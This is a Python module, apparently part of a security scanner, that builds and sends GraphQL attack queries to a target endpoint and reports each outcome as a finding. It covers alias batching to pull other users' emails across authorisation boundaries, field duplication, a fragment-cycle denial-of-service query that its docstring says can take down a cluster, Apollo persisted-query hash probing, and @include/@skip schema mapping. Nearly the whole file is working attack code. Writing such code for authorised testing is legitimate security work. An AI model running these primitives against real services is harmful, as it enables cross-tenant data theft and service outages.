"""GraphQL batching, alias, and field-duplication attack module.

Modern GraphQL implementations (Apollo, Hasura, GraphQL-Java,
nestjs-graphql) expose a range of high-payout attack primitives
that the existing ``graphql_introspection`` detector doesn't
cover:

* Alias-based batching — ``{ a: user(id: 1) { email } b: user(id: 2) { email } }``
  to exfiltrate data across authorization boundaries.
* Field-duplication / nested-aliased expansion — many resolvers
  are re-invoked for every alias, so the same query can multiply
  the cost of an expensive field by N.
* Fragment cycle DoS — deeply-nested ``... on`` fragments that
  trigger exponential expansion server-side.
* Persisted query ID brute-force — Apollo's APQ feature exposes
  ``extensions.persistedQuery.sha256Hash``; operators can probe
  known hashes to learn what queries other users have issued.
* ``@include`` / ``@skip`` conditional leakage — toggling
  directives to map hidden schema.

The :class:`GraphQLBatchAttack` module wraps an HTTP endpoint with
a small client that issues each attack primitive and reports the
outcome as a :class:`GraphQLAttackFinding`. The module does not
require introspection to be enabled — most of the attacks work
against any GraphQL endpoint that has a query root.
"""

from __future__ import annotations

import json
import logging
import time
from collections.abc import Iterable, Mapping
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin

import httpx

logger = logging.getLogger(__name__)


@dataclass
class GraphQLAttackFinding:
    """A single observation from a GraphQL attack primitive."""

    attack: str
    severity: str
    description: str
    evidence: dict[str, Any] = field(default_factory=dict)
    response_status: int | None = None
    response_time_ms: float | None = None
    cost_estimate: int | None = None


def _introspection_query() -> str:
    return (
        "{ __schema { queryType { name } mutationType { name } "
        "subscriptionType { name } } }"
    )


def alias_batching_query(target_field: str, ids: Iterable[Any]) -> str:
    """Build an alias-batched query that asks for the same field
    N times under different aliases, each with a different
    ``id`` argument. Used to test cross-tenant authorisation.
    """
    parts: list[str] = []
    for i, value in enumerate(ids):
        parts.append(
            f'a{i}: {target_field}(id: "{value}") {{ id email }}'
        )
    return "query AliasBatch { " + " ".join(parts) + " }"


def field_duplication_query(target_field: str, count: int) -> str:
    """Build a query that asks for the same field ``count`` times."""
    return (
        "query DupField { "
        + " ".join(f"f{i}: {target_field} {{ id }}" for i in range(count))
        + " }"
    )


def fragment_cycle_query(depth: int) -> str:
    """Build a deeply nested fragment that expands exponentially server-side.

    Real-world example: production Hasura instances amplify the
    schema by N^depth, so a 12-level fragment can take down a
    cluster with a single request.
    """
    if depth < 1:
        return "{ __typename }"
    body = "{ ... frag" + str(depth - 1) + " __typename }"
    for d in range(depth - 1, -1, -1):
        frag = f"fragment frag{d} on Query {{ {' ... frag' + str(d - 1) + ' ' if d > 0 else ''}__typename }}"
        body = body + " " + frag
    return body


def persisted_query_probe(shas: Iterable[str]) -> dict[str, Any]:
    """Build an Apollo APQ probe that tries known persisted query IDs."""
    extensions = {"persistedQuery": {"version": 1, "sha256Hash": ""}}
    body: list[dict[str, Any]] = []
    for sha in shas:
        ext = json.loads(json.dumps(extensions))
        ext["persistedQuery"]["sha256Hash"] = sha
        body.append({"operationName": None, "variables": {}, "extensions": ext})
    return {"queries": body}


def include_skip_probe(field_path: str) -> str:
    """Build a query that toggles ``@include``/``@skip`` to map
    which fields are conditionally rendered.
    """
    return (
        "query CondProbe { "
        f"  a: {field_path} @include(if: true) {{ __typename }} "
        f"  b: {field_path} @include(if: false) {{ __typename }} "
        f"  c: {field_path} @skip(if: true) {{ __typename }} "
        f"  d: {field_path} @skip(if: false) {{ __typename }} "
        "}"
    )


@dataclass
class GraphQLBatchAttack:
    """High-payout GraphQL attack primitives.

    The runner is intentionally synchronous. Each primitive is
    issued once and the response is captured. The class is safe
    to use from a worker thread.
    """

    endpoint: str
    headers: Mapping[str, str] | None = None
    timeout: float = 10.0
    verify_ssl: bool = True
    client: httpx.Client | None = None
    _owns_client: bool = False

    def __post_init__(self) -> None:
        if self.client is None:
            self.client = httpx.Client(
                timeout=self.timeout,
                verify=self.verify_ssl,
                headers=dict(self.headers or {}),
            )
            self._owns_client = True

    def close(self) -> None:
        if self._owns_client and self.client is not None:
            self.client.close()

    def __enter__(self) -> GraphQLBatchAttack:
        return self

    def __exit__(self, *_args: Any) -> None:
        self.close()

    # ------------------------------------------------------------------
    # Primitives
    # ------------------------------------------------------------------

    def _post(self, payload: dict[str, Any] | list[Any]) -> tuple[httpx.Response, float]:
        assert self.client is not None
        start = time.monotonic()
        response = self.client.post(
            self.endpoint, json=payload, headers={"Accept": "application/json"}
        )
        return response, (time.monotonic() - start) * 1000.0

    def run_alias_batching(
        self,
        target_field: str = "user",
        ids: Iterable[Any] = (1, 2, 3),
    ) -> GraphQLAttackFinding:
        ids_list = list(ids)
        query = alias_batching_query(target_field, ids_list)
        response, elapsed = self._post({"query": query, "variables": {}})
        body = self._safe_json(response)
        return GraphQLAttackFinding(
            attack="alias_batching",
            severity="high",
            description=(
                "Aliased query asks for the same field N times with "
                "different arguments. If responses differ, authorization "
                "may be per-resolver rather than per-query — a classic "
                "IDOR/BOLA primitive."
            ),
            evidence={
                "query": query,
                "response_body": body if isinstance(body, (dict, list)) else str(body)[:1000],
                "ids": ids_list,
            },
            response_status=response.status_code,
            response_time_ms=elapsed,
            cost_estimate=len(ids_list),
        )

    def run_field_duplication(
        self,
        target_field: str = "expensiveField",
        count: int = 50,
    ) -> GraphQLAttackFinding:
        query = field_duplication_query(target_field, count)
        response, elapsed = self._post({"query": query, "variables": {}})
        body = self._safe_json(response)
        return GraphQLAttackFinding(
            attack="field_duplication",
            severity="medium",
            description=(
                "Same field requested N times under different aliases. "
                "Many resolvers are re-evaluated per alias, so a single "
                "request can multiply the cost of an expensive operation "
                "by N — useful for cost-analysis DoS."
            ),
            evidence={
                "query": query,
                "response_body": body if isinstance(body, (dict, list)) else str(body)[:1000],
                "count": count,
            },
            response_status=response.status_code,
            response_time_ms=elapsed,
            cost_estimate=count,
        )

    def run_fragment_cycle(self, depth: int = 8) -> GraphQLAttackFinding:
        query = fragment_cycle_query(depth)
        response, elapsed = self._post({"query": query, "variables": {}})
        body = self._safe_json(response)
        return GraphQLAttackFinding(
            attack="fragment_cycle_dos",
            severity="high",
            description=(
                "Fragment cycle DoS. A deeply-nested fragment can expand "
                "exponentially on the server (e.g. N^depth) and trigger "
                "CPU exhaustion with a single small request."
            ),
            evidence={
                "query": query[:4000],
                "response_body": body if isinstance(body, (dict, list)) else str(body)[:1000],
                "depth": depth,
            },
            response_status=response.status_code,
            response_time_ms=elapsed,
            cost_estimate=2**depth if depth < 25 else None,
        )

    def run_persisted_query_probe(
        self, shas: Iterable[str]
    ) -> GraphQLAttackFinding:
        shas_list = list(shas)
        payload = persisted_query_probe(shas_list)
        response, elapsed = self._post(payload)
        body = self._safe_json(response)
        return GraphQLAttackFinding(
            attack="persisted_query_probe",
            severity="medium",
            description=(
                "Apollo APQ SHA256 hash probe. The server returns 'PERSISTED_QUERY_NOT_FOUND' "
                "or 'PERSISTED_QUERY_NOT_SUPPORTED' for unknown hashes and 'PERSISTED_QUERY_OK' "
                "for known ones — which leaks the existence of saved queries."
            ),
            evidence={
                "shas": shas_list,
                "response_body": body if isinstance(body, (dict, list)) else str(body)[:1000],
            },
            response_status=response.status_code,
            response_time_ms=elapsed,
        )

    def run_include_skip(self, field_path: str = "secretField") -> GraphQLAttackFinding:
        query = include_skip_probe(field_path)
        response, elapsed = self._post({"query": query, "variables": {}})
        body = self._safe_json(response)
        return GraphQLAttackFinding(
            attack="include_skip_leakage",
            severity="low",
            description=(
                "@include / @skip directive toggle. Differences in "
                "responses between the true and false branches can reveal "
                "hidden schema or conditional access control."
            ),
            evidence={
                "query": query,
                "response_body": body if isinstance(body, (dict, list)) else str(body)[:1000],
                "field_path": field_path,
            },
            response_status=response.status_code,
            response_time_ms=elapsed,
        )

    def run_all(self) -> list[GraphQLAttackFinding]:
        return [
            self.run_alias_batching(),
            self.run_field_duplication(),
            self.run_fragment_cycle(),
            self.run_persisted_query_probe(
                [
                    "0123456789abcdef" * 4,  # 64-char hex placeholder
                ]
            ),
            self.run_include_skip(),
        ]

    @staticmethod
    def _safe_json(response: httpx.Response) -> Any:
        try:
            return response.json()
        except json.JSONDecodeError:
            return response.text[:1000]


__all__ = [
    "GraphQLAttackFinding",
    "GraphQLBatchAttack",
    "alias_batching_query",
    "field_duplication_query",
    "fragment_cycle_query",
    "persisted_query_probe",
    "include_skip_probe",
    "_introspection_query",
]
